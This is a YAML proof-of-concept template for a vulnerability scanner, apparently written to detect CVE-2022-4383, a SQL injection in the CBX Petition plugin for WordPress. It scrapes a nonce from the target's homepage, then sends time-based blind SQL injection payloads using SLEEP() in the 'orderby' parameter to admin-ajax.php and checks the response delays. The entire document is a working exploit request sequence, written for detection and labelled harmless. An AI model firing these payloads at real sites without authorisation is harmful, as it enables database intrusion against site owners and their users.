name: yaml-poc-codeboxr-cbx_petition_for_wordpress-sql_injection-CVE-2022-4383
binding: b5cb694a-3c00-4b8d-8d2b-56a07a0fedff
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/e0fe5a53-8ae2-4b67-ac6e-4a8860e39035
    vulnerability:
        id: 0958625a-6798-4cb4-91ab-a09dbba1fafc
        level: critical
    warning: Harmless
transport: http
set:
    sleepSecond1: randomInt(6, 8)
    sleepSecond2: randomInt(3, 5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && 'admin-ajax.php","nonce'.matches(response.body_string)
        output:
            search: '''admin-ajax.php","nonce":"(?P<nonce>.+?)"''.bsubmatch(response.body)'
            Nonce: search["nonce"]
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=cbxpetition_load_more_signs&security={{Nonce}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: petition_id=2133&perpage=30&order=xxxxxxxxx&page=2&orderby=id AND (SELECT 4657 FROM (SELECT(SLEEP(0)))kvyf)
            follow_redirects: false
        expression: response.status == 200
        output:
            r0latency: response.latency
    r2:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=cbxpetition_load_more_signs&security={{Nonce}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: petition_id=2133&perpage=30&order=xxxxxxxxx&page=2&orderby=id AND (SELECT 4657 FROM (SELECT(SLEEP({{sleepSecond1}})))kvyf)
            follow_redirects: false
        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
    r3:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=cbxpetition_load_more_signs&security={{Nonce}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: petition_id=2133&perpage=30&order=xxxxxxxxx&page=2&orderby=id AND (SELECT 4657 FROM (SELECT(SLEEP({{sleepSecond2}})))kvyf)
            follow_redirects: false
        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
expression: r0() && r1() && r2() && r3()
